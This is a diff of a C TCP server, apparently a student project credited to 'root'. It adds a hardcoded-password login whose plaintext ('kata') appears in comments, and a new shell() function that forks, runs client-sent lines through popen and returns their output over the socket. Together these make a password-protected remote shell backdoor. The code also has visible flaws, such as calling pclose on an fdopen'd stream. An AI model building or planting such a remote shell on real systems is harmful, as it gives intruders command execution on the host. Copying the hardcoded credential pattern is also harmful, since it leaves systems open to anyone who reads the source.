@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/07/19 04:35:35 by root             ###   ########.fr       */
+/*   Updated: 2018/07/20 08:36:05 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -29,7 +29,7 @@ static int			openSocket(struct addrinfo *p)
 		return -1;
 	if (!setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) &&
 		!bind(fd, p->ai_addr, p->ai_addrlen) &&
-		!listen(fd, CLIENT_MAX))
+		!listen(fd, SERVER_CLIENT_MAX))
 		return fd;
 	close(fd);
 	return -1;
@@ -74,7 +74,7 @@ void					serverAcceptConnections(t_sv *server)
 	fd = accept(server->fd, &csin, &len);
 	if (fd < 0)
 		return ;
-	for (int i = 0; i < CLIENT_MAX; i++) {
+	for (int i = 0; i < SERVER_CLIENT_MAX; i++) {
 		if (server->client[i].fd == -1) {
 			server->client[i].fd = fd;
 			clientWrite("Pass: ", &server->client[i]);
@@ -85,43 +85,85 @@ void					serverAcceptConnections(t_sv *server)
 	close(fd);
 }
 
-static void			serverCommands(u_char *buff, int size, t_cl *client)
+static void			serverLogging(u_char *buff, int size, t_cl *client)
+{
+	memset(buff + size, 0, SERVER_CLIENT_BUFF - size);
+	encrypt(buff, size);
+	//kata (4): 201 121 30 74
+	//KATA (4): 44 92 192 65
+	//KatA (4): 116 103 224 84
+	if (buff[0] == 201	&&
+		buff[1] == 121	&&
+		buff[2] == 30	&&
+		buff[3] == 74) {
+		client->logged = 1;
+		clientWrite("$> ", client);
+	} else {
+		clientWrite("Pass: ", client);
+	}
+}
+
+static void			serverCommands(char *buff, t_cl *client)
 {
 	static char		*cmd[] = { SERVER_COMMANDS };
 	static void		(*func[])(t_cl *) = { SERVER_FUNCTIONS };
 
-	if (!client->logged) {
-		memset(buff + size, 0, CLIENT_BUFF - size);
-		encrypt(buff, size);
-		//kata (4): 201 121 30 74
-		//KATA (4): 44 92 192 65
-		//KatA (4): 116 103 224 84
-		if (buff[0] == 201	&&
-			buff[1] == 121	&&
-			buff[2] == 30	&&
-			buff[3] == 74) {
-			client->logged = 1;
-		} else {
-			clientWrite("Pass: ", client);
-			return ;
-		}
-	} else {
-		for (size_t i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
-			if (!strcmp(cmd[i], (char *)buff)) {
-				func[i](client);
-				break ;
-			}
+	for (size_t i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
+		if (!strcmp(cmd[i], buff)) {
+			func[i](client);
+			break ;
 		}
 	}
 	clientWrite("$> ", client);
 }
 
+static void			shell(char *buff, t_cl *client)
+{
+	pid_t		pid;
+
+	pid = fork();
+	if (pid == 0)
+	{
+		FILE *fd = fdopen(client->fd, "r +");
+		if (fd == NULL) {
+			clientWrite("Failed to open shell\n", client);
+			exit(0);
+		}
+		while (1) {
+			FILE	*sh;
+			char 	*ret;
+
+			sh = popen(buff, "r");
+			if (sh == NULL)
+				break ;
+			while (1) {
+				ret = fgets(buff, SERVER_CLIENT_BUFF, sh);
+				if (ret == NULL)
+					break ;
+				if (fputs(buff, fd) < 0)
+					break ;
+			}
+			fputs("NEXT\n", fd);
+			ret = fgets(buff, SERVER_CLIENT_BUFF, sh);
+			pclose(sh);
+			if (ret == NULL)
+				break ;
+		}
+		fputs("FINI\n", fd);
+		pclose(fd);
+//		serverQuitClient(client);
+		exit(0);
+	} else if (pid < 0) {
+		clientWrite("Failed to fork shell\n", client);
+	}
+}
+
 void				serverReadClient(t_cl *client)
 {
-	char			buff[CLIENT_BUFF];
+	char			buff[SERVER_CLIENT_BUFF];
 	int				ret;
 
-	ret = read(client->fd, buff, CLIENT_BUFF);
+	ret = read(client->fd, buff, SERVER_CLIENT_BUFF);
 	if (ret <= 0)
 		return serverQuitClient(client);
 	clientRead(buff, ret, client);
@@ -132,11 +174,16 @@ void				serverReadClient(t_cl *client)
 		buff[ret++] = *ptr;
 		if (*ptr == '\n') {
 			buff[ret - 1] = '\0';
-			serverCommands((u_char *)buff, ret - 1, client);
+			if (!client->logged)
+				serverLogging((u_char *)buff, ret - 1, client);
+			else if (!client->shell)
+				serverCommands(buff, client);
+			else
+				shell(buff, client);
 			ret = 0;
-			client->rd.tail = moveTail(ptr, client->rd.buff, CLIENT_BUFF);
+			client->rd.tail = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
 		}
-		ptr = moveTail(ptr, client->rd.buff, CLIENT_BUFF);
+		ptr = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
 	}
 }
 
@@ -149,7 +196,7 @@ void				serverWriteClient(t_cl *client)
 			ret = write(client->fd, client->wr.tail, client->wr.head - client->wr.tail);
 			client->wr.tail = client->wr.head;
 		} else {
-			ret = write(client->fd, client->wr.tail, client->wr.buff + CLIENT_BUFF - (client->wr.tail));
+			ret = write(client->fd, client->wr.tail, client->wr.buff + SERVER_CLIENT_BUFF - (client->wr.tail));
 			client->wr.tail = client->wr.buff;
 		}
 		if (ret <= 0)
@@ -159,7 +206,7 @@ void				serverWriteClient(t_cl *client)
 
 void				quitServer(t_sv *server)
 {
-	for (int i = 0; i < CLIENT_MAX; i++)
+	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
 	{
 		if (server->client[i].fd != -1)
 			close(server->client[i].fd);
